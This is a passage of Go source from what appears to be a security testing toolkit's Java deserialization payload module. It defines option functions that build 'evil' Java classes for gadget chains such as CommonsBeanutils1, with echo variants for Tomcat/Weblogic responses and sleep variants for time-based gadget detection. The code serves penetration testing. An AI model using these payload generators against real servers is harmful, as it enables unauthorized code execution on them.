// headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassTomcatEcho, options...)
}

// SetClassMultiEchoTemplate
// useClassMultiEchoTemplate 请求参数选项函数，用于设置生成 MultiEcho 类的模板，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
// Example:
// ```
// body 回显
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassMultiEchoTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassMultiEcho
	}
}

// SetMultiEchoEvilClass
// useMultiEchoEvilClass 请求参数选项函数，设置 MultiEcho 类，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
// 和 useClassMultiEchoTemplate 的功能一样
// Example:
// ```
// body 回显
// bodyClassObj,_ =  yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetMultiEchoEvilClass() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassMultiEcho
	}
}

// GenMultiEchoClassObject
// GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// body 回显
// bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
// headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassMultiEcho, options...)
}

// SetClassHeaderEchoTemplate
// useHeaderEchoTemplate 请求参数选项函数，用于设置生成HeaderEcho类的模板，需要配合 useHeaderParam 使用。
// 自动查找Response对象并在header中回显指定内容，需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassHeaderEchoTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassMultiEcho
		config.SetParam(ClassParamPosition, "header")
		config.SetParam(ClassParamAction, "echo")
	}
}

// SetHeaderEchoEvilClass
// useHeaderEchoEvilClass 请求参数选项函数，设置 HeaderEcho 类，需要配合 useHeaderParam 使用。
// 和 useHeaderEchoTemplate 的功能一样
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetHeaderEchoEvilClass() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassMultiEcho
		config.SetParam(ClassParamPosition, "header")
		config.SetParam(ClassParamAction, "echo")
	}
}

// GenHeaderEchoClassObject
// GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassMultiEcho, append([]GenClassOptionFun{SetClassHeaderEchoTemplate()}, options...)...)
}

// SetClassSleepTemplate
// useSleepTemplate 请求参数选项函数，用于设置生成 Sleep 类的模板，需要配合 useSleepTime 使用，主要用与指定 sleep 时长，用于延时检测gadget。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
// ```
func SetClassSleepTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassSleep
	}
}

// SetSleepEvilClass
// useSleepEvilClass 请求参数选项函数，设置 Sleep 类，需要配合 useSleepTime 使用。
// 和 useSleepTemplate 的功能一样
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
// ```
func SetSleepEvilClass() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassSleep
	}
}

// GenSleepClassObject
// GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// yso.GenerateSleepClassObject(yso.useSleepTime(5))
// ```
func GenSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassSleep, options...)
}

// SetSleepTime
// useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
// ```
func SetSleepTime(time int) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamTime, strconv.Itoa(time))
	}
}
